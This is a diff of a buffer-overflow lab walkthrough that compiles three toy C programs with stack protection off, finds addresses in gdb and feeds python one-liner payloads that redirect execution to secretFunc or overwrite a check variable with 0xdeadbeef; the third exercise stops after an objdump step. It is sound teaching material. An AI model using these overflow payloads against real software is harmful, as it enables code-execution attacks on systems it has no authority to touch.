@@ -31,13 +31,13 @@
      cd bof
      ```
      and Open you VSCode -> Connect to WSL -> Open folder `bof`  and catch file bof1, bof2, bof3 from `https://github.com/quang-ute/Security-labs/tree/main/Software/buffer-overflow`
-## Attack
+## Attack ( BOF 1 )
 ![image](https://github.com/user-attachments/assets/3ca0dd01-c5b1-4abd-adcb-757f64f60c0d)
 If an attacker supplies more input than the buffer array[200] can handle, they could potentially control the flow of the program and execute unintended code.
 
 1. On `/seclabs/bof$`
    ```bash
-   gcc -g bof1.c -o bof.out -fno-stack-protector -mpreferred-stack-boundary=2
+   gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2
    ```
    and load bof1.out in gdb
   
@@ -49,6 +49,7 @@ If an attacker supplies more input than the buffer array[200] can handle, they c
      disas secretFunc
      ```
      ![image](https://github.com/user-attachments/assets/7ee1e5e0-441a-4a39-9a40-bb98f3545acc)
+  
   The secretFunc() memory region is `0x0804846b`
   3. Input 'a'*204 followed by `0x0804846b`
      ```bash
@@ -60,10 +61,42 @@ If an attacker supplies more input than the buffer array[200] can handle, they c
      ```bash
      echo $( python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out 120
      ```
-     ![image](https://github.com/user-attachments/assets/3074ef1f-1809-45df-b5aa-61ef31dffcff)
 
      
+     ![image](https://github.com/user-attachments/assets/3074ef1f-1809-45df-b5aa-61ef31dffcff)
+
+  ## Attack ( BOF 2 )
+  
+  ![image](https://github.com/user-attachments/assets/fddde23e-e6fd-4c80-bddd-f2250f004701)
+
+> Since buf is only 40 characters in size, but fgets allows input of up to 45 characters, this can overwrite the memory after the buf array, including the check variable. If you enter enough data to overwrite the value of check, you can change it to 0xdeadbeef, leading to the condition being satisfied and printing the winning message.
+
+1.  On `/seclabs/bof$`
+   ```bash
+   gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2
+   ```
+  
+2. 
+
+```bash
+ echo $(python -c "print('a'*40)" + '\x01\x02\x03\x04' ) | ./bof2.out
+```
+
+Terminal will be return  `You are on the right way!`
+![image](https://github.com/user-attachments/assets/83deaff6-f75f-46f9-8fdf-8dce2ad89d7a)
 
 
+If you want to print `Yeah! You win!`
+echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde' )") | ./bof2.out
+![image](https://github.com/user-attachments/assets/57848a21-9021-4c9c-994a-555c01043102)
 
-    
+
+ ## Attack ( BOF 3 )    
+The first of all, you have to run 
+```bash
+objdump -d bof3.out | grep shell
+```
+
+
+ ![image](https://github.com/user-attachments/assets/2298c0b9-23b6-4bd3-b4fb-31c653e51de7)
+
